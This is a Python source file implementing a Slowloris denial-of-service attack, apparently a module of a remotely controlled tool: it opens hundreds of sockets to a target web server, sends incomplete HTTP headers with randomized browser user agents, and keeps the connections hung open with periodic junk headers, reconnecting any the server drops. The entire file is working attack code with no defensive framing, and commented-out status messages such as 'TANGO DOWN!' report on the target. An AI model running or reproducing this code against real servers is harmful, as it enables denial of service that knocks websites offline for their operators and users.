import socket
import random
from datetime import datetime
import ssl
import threading
import time
import re


class TargetInfo:
    """This class stores information about the target."""

    def __init__(self, host, port, ssl, connection_count=200):
        self.host = host
        self.port = port
        self.ssl = ssl
        self.connection_count = connection_count
        self.connections = []

        # Statistics related
        self.latest_latency_list = []
        self.rejected_initial_connections = 0
        self.rejected_connections = 0
        self.dropped_connections = 0
        self.reconnections = 0

    def get_latency(self):
        """Gets the latency in milliseconds."""
        latency = 0
        element_count = len(self.latest_latency_list)

        if element_count == 0:
            return None
        for value in self.latest_latency_list:
            latency += value

        return latency / element_count


class UserAgent:
    """Static class which provides randomized user agents."""

    USER_AGENTS = [
        # Chrome
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
        "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
        # Firefox
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
        "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0",
        "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0",
        "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
    ]

    @staticmethod
    def get_random():
        """:return A random user agent string."""
        return random.choice(UserAgent.USER_AGENTS)


class Connection:
    """Slowloris connection."""

    def __init__(self, target, first_connection=False):
        """
        :type target: TargetInfo
        :type first_connection: bool
        """
        self.target = target
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(5)
        try:
            start_time = datetime.now()
            self.socket.connect((target.host, target.port))
            self.socket.settimeout(None)
            if target.ssl:
                self.socket = ssl.wrap_socket(self.socket)

            if not first_connection:
                latency = (datetime.now() - start_time).total_seconds() * 1000.0

                if len(target.latest_latency_list) < 10:
                    target.latest_latency_list.append(latency)
                else:
                    target.latest_latency_list.pop(0)
                    target.latest_latency_list.insert(0, latency)
            self.connected = True
        except socket.timeout:
            self.connected = False
            # Keep track of rejected connections
            if first_connection:
                target.rejected_initial_connections += 1
            else:
                target.rejected_connections += 1
            # Report first initial rejection to the user
            if first_connection and target.rejected_initial_connections == 1:
                #send_response("[%s] New connections are getting rejected." % target.host)
                pass
            # Report rejected reconnection to the user
            if not first_connection:
                #send_response("TANGO DOWN! Target unreachable.")
                pass

    def is_connected(self):
        """:return True if the connection has been established."""
        return self.connected

    def close(self):
        """Closes the connection."""
        try:
            self.socket.shutdown(1)
            self.socket.close()
        except Exception:
            pass

    def send_headers(self, user_agent):
        """Sends headers."""
        template = "GET /?%s HTTP/1.1\\r\\n%s\\r\\nAccept-language: en-US,en,q=0.5\\r\\n"
        try:
            self.socket.send((template % (random.randrange(0, 2000), user_agent)).encode("ascii"))
        except socket.timeout:
            pass
        return self

    def keep_alive(self):
        """Sends garbage to keep the connection alive."""
        try:
            self.socket.send(("X-a: %s\\r\\n" % (random.randint(0, 5000))).encode("ascii"))
        except socket.timeout:
            pass


class Controller:
    """Controls all slowloris connections."""

    def __init__(self):
        self.target = None
        self.stopped = False

        self.keepalive_thread = threading.Thread(target=self.keep_alive)
        self.keepalive_thread.daemon = True
        self.keepalive_thread.start()

    def attack(self, target):
        """Starts the attack against the target.

        :type target: TargetInfo
        """
        #send_response("[%s] Initializing %s connections..." % (target.host, target.connection_count))
        self.target = target

        # Start x connections and send the initial HTTP headers.
        for i in range(target.connection_count):
            if self.stopped:
                break

            conn = Connection(target, True).send_headers(UserAgent.get_random())
            self.target.connections.insert(0, conn)

            if i == (self.target.connection_count - 1):
                #send_response("All connections initialized.")
                pass

    def stop(self):
        """Stops the attack."""
        #send_response("Shutting down all connections.")
        self.stopped = True

        for conn in self.target.connections:
            conn.close()

    def keep_alive(self):
        """Background thread which keeps all connections alive."""
        while True:
            if self.stopped:
                #send_response("Stopped slowloris attack.")
                break

            time.sleep(5)
            self.keep_target_alive(self.target)

    def keep_target_alive(self, target):
        """Keeps all connections alive."""
        # Print latest latency.
        latency = target.get_latency()

        if latency:
            # ! send_response("[%s] Current latency: %s ms" % (target.host, latency))
            pass

        connection_count = len(target.connections)

        # Every 10 seconds, send HTTP garbage to prevent the connection from timing out.
        for i in range(0, connection_count):
            try:
                if self.stopped:
                    break

                target.connections[i].keep_alive()

                # If the server closed one of our connections,
                # re-open the connection in its place.
            except Exception:
                if target.dropped_connections == 0:
                    # Notify the server that the host started dropping connections.
                    #send_response("[%s] Server started dropping connections." % target.host, "slowloris")
                    pass

                target.dropped_connections += 1

                # Notify the user about the amount of reconnections.
                threshold = 10

                if target.reconnections >= threshold:
                    # send_response(
                    #    "[%s] Reconnected %s dropped connections." % (target.host, target.reconnections),
                    #    "slowloris"
                    #)
                    target.reconnections = 0

                # Reconnect the socket.
                conn = Connection(target).send_headers(UserAgent.get_random())

                if conn.is_connected:
                    target.connections[i] = conn
                    target.reconnections += 1


def get_webserver(target):
    """
    :return The name of the running web server.
    :param target: TargetInfo
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)

    try:
        sock.connect((target.host, target.port))
        sock.send("GET / HTTP/1.1\\r\\n\\r\\n".encode("ascii"))

        response = sock.recv(1024).decode("utf-8")

        sock.shutdown(1)
        sock.close()

        for line in response.split("\\r\\n"):
            if line.startswith("Server:"):
                return line.split("Server:")[1].strip()
    except Exception:
        return None
    return None


def parse_target(target):
    """Parses a target into a TargetInfo object."""
    pat = re.compile(r"(?P<host>(?:\w|\.)+)(\:(?P<port>\d+))?")
    mat = pat.match(target)
    host, port = (mat.group("host"), mat.group("port"))
    port = 80 if port is None else int(port)
    ssl = port == 443
    return TargetInfo(host, port, ssl)


def run(options):
    # Pack it up, pack it in, let me begin...
    target = options["target"]

    controller = Controller()
    #send_response("Starting slowloris attack against: " + target)

    try:
        # Spawn the attacking thread
        attack_thread = threading.Thread(target=controller.attack, args=(parse_target(target),))
        attack_thread.daemon = True
        attack_thread.start()

        while True:
            # So we can catch when the user kills this task.
            time.sleep(1)
    except SystemExit:
        # Kill task called, stop attacking.
        controller.stop()
